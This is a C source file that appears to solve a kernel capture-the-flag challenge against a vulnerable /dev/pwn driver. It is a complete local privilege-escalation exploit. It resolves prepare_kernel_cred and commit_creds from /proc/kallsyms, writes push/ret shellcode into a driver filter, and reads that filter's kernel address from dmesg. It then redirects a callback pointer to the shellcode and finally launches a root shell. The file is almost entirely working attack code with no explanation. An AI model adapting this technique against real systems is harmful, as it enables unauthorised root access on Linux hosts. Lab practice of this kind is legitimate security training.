#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *) __attribute__((regparm(3)));
int (*commit_creds)(struct cred *) __attribute__((regparm(3)));

void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

void *get_symbol(const char *name)
{
    char type;
    char symbol[512];
    void *address;
    FILE *f = fopen("/proc/kallsyms", "r");
    while (fscanf(f, "%p %c %s\n", &address, &type, symbol) > 0 ) {
        if (!strcmp(symbol, name))
            return address;
    }

    return NULL;
}

#define MY_PR 0x22
#define MY_ID 10101010

struct callback_filter {
    unsigned int pr_num;
    unsigned int id;
    void (*callback)(struct callback_filter *);
    struct callback_filter * next;
    struct callback_filter * prev;
};

struct disallow_filter {
    unsigned int pr_num;
    unsigned int port;
    unsigned int id;
    struct disallow_filter * next;
    struct disallow_filter * prev;
};


int main(int argc, char* argv[])
{
    char buf[1024] = {0};
    char jmp[5];
    void *address;

    prepare_kernel_cred = get_symbol("prepare_kernel_cred");
    printf("Found prepare_kernel_cred at %p\n", prepare_kernel_cred);
    commit_creds = get_symbol("commit_creds");
    printf("Found commit_creds at %p\n", commit_creds);

    printf("Will try to return to %p\n", get_root);

    printf("Opening /dev/pwn\n");
    int fd = open("/dev/pwn", O_RDWR);
    if (fd <= 0) {
        printf("unable to open /dev/pwn\n");
        return 1;
    }

    // Write in a callback filter
    printf("Creating a callback filter\n");
    char c_filt[sizeof(struct callback_filter) + 1];
    c_filt[0] = '\x03'; // Command add callback filter
    struct callback_filter *filter = (struct callback_filter*)&c_filt[1];
    filter->pr_num = MY_PR;
    filter->id = MY_ID;
    filter->callback = 0; // Doesn't matter
    filter->next = 0; // Doesn't matter
    filter->prev = 0; // Doesn't matter
    write(fd, &c_filt, sizeof(c_filt));

    // Create a bogus dfilter that contains a jump to get_root
    printf("Creating a disallow filter containing a ret-to-userspace shellcode\n");
    char d_filt[sizeof(struct disallow_filter) + 1];
    d_filt[0] = '\x02'; // Command add disallow filter
    d_filt[1] = '\x68'; // Push
    *(int*)(&d_filt[2]) = (int)get_root;
    d_filt[6] = '\xc3'; // Ret
    write(fd, &d_filt, sizeof(d_filt));

    // Pulling out the address of the filter from dmesg
    printf("Taking address of shellcode from dmesg\n");
    system("dmesg | tail -4 | grep \"New Filter At Address\" | cut -b 39- > addr");
    char num[8];
    int f = open("./addr", O_RDONLY);
    read(f, num, 8);
    int dfilt_addr = strtoul(num, NULL, 16);
    printf("Got addr 0x%08X\n", dfilt_addr);

    // Change the callback address
    printf("Changing the callback address of my callback filter to point to this shellcode\n");
    int y[3];
    y[0] = 4;
    y[1] = MY_ID; // ID to match
    y[2] = dfilt_addr;
    write(fd, &y, sizeof(y));

    // Verify
    printf("time to check...\n");
    getchar();

    // Now trigger a packet of this type
    printf("Emulating a packet to trigger callback\n");
    char z[5];
    z[0] = '\x05';
    *((int*)&z[1]) = MY_PR;
    write(fd, &z, sizeof(z));

    // Finally, run a shell
    printf("Running shell\n");
    system("/bin/sh");

cleanup:
    close(fd);
    return 0;
}
